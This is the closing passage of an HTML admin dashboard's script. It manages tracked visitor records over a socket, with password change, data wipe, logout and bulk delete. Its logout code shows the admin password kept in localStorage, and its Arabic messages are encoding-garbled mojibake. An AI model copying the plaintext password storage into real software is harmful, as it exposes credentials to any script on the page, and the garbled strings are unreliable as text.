    document.addEventListener('click', (e) => {
      const menu = document.getElementById('settingsMenu');
      const btn = document.getElementById('settingsBtn');
      if (!menu.contains(e.target) && !btn.contains(e.target)) {
        menu.classList.add('hidden');
      }
    });

    // Change password modal functions
    function showChangePasswordModal() {
      document.getElementById('settingsMenu').classList.add('hidden');
      document.getElementById('changePasswordModal').classList.remove('hidden');
      document.getElementById('oldPassword').value = '';
      document.getElementById('newPassword').value = '';
      document.getElementById('confirmPassword').value = '';
      document.getElementById('passwordError').classList.add('hidden');
      document.getElementById('passwordSuccess').classList.add('hidden');
    }

    function hideChangePasswordModal() {
      document.getElementById('changePasswordModal').classList.add('hidden');
    }

    // Change password form handler
    document.getElementById('changePasswordForm').addEventListener('submit', (e) => {
      e.preventDefault();
      const oldPassword = document.getElementById('oldPassword').value;
      const newPassword = document.getElementById('newPassword').value;
      const confirmPassword = document.getElementById('confirmPassword').value;
      const errorEl = document.getElementById('passwordError');
      const successEl = document.getElementById('passwordSuccess');

      errorEl.classList.add('hidden');
      successEl.classList.add('hidden');

      if (!oldPassword || !newPassword || !confirmPassword) {
        errorEl.textContent = 'ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„';
        errorEl.classList.remove('hidden');
        return;
      }

      if (newPassword !== confirmPassword) {
        errorEl.textContent = 'ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© ØºÙŠØ± Ù…ØªØ·Ø§Ø¨Ù‚Ø©';
        errorEl.classList.remove('hidden');
        return;
      }

      socket.emit('admin:changePassword', { oldPassword, newPassword });
    });

    // Clear all data function
    function clearAllData() {
      document.getElementById('settingsMenu').classList.add('hidden');
      if (confirm('ØªØ­Ø°ÙŠØ±: Ø³ÙŠØªÙ… Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø²ÙˆØ§Ø± ÙˆØ§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ø´ÙƒÙ„ Ù†Ù‡Ø§Ø¦ÙŠ!\n\nÙ‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ØŸ')) {
        if (confirm('Ù‡Ø°Ø§ Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„ØªØ±Ø§Ø¬Ø¹ Ø¹Ù†Ù‡!\n\nØ§Ø¶ØºØ· Ù…ÙˆØ§ÙÙ‚ Ù„Ù„ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ')) {
          socket.emit('admin:clearAllData');
          visitors.clear();
          selectedVisitorId = null;
          renderVisitorsList();
          visitorDetails.innerHTML = '<div class="text-center py-12 text-gray-500"><svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg><p>Ø§Ø®ØªØ± Ø²Ø§Ø¦Ø± Ù„Ø¹Ø±Ø¶ Ø§Ù„ØªÙØ§ØµÙŠÙ„</p></div>';
          alert('ØªÙ… Ù…Ø³Ø­ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù†Ø¬Ø§Ø­');
        }
      }
    }

    // Logout function
    function logout() {
      localStorage.removeItem('adminPassword');
      if (socket) {
        socket.disconnect();
      }
      dashboard.classList.add('hidden');
      loginModal.style.display = 'flex';
      document.getElementById('password').value = '';
      loginError.classList.add('hidden');
    }

    // Select all visitors
    function selectAllVisitors() {
      const checkboxes = document.querySelectorAll('.visitor-checkbox');
      const allChecked = Array.from(checkboxes).every(cb => cb.checked);
      checkboxes.forEach(cb => cb.checked = !allChecked);
    }

    // Delete selected visitors
    function deleteSelectedVisitors() {
      const checkboxes = document.querySelectorAll('.visitor-checkbox:checked');
      if (checkboxes.length === 0) {
        alert('ÙŠØ±Ø¬Ù‰ ØªØ­Ø¯ÙŠØ¯ Ø²Ø§Ø¦Ø± ÙˆØ§Ø­Ø¯ Ø¹Ù„Ù‰ Ø§Ù„Ø£Ù‚Ù„');
        return;
      }
      if (confirm('Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ø­Ø°Ù ' + checkboxes.length + ' Ø²Ø§Ø¦Ø±ØŸ')) {
        checkboxes.forEach(cb => {
          const visitorId = cb.dataset.visitorId;
          socket.emit('admin:deleteById', visitorId);
          visitors.delete(visitorId);
        });
        if (selectedVisitorId && !visitors.has(selectedVisitorId)) {
          selectedVisitorId = null;
          visitorDetails.innerHTML = '<div class="text-center py-12 text-gray-500"><svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg><p>Ø§Ø®ØªØ± Ø²Ø§Ø¦Ø± Ù„Ø¹Ø±Ø¶ Ø§Ù„ØªÙØ§ØµÙŠÙ„</p></div>';
        }
        renderVisitorsList();
      }
    }
  </script>
</body>
</html>
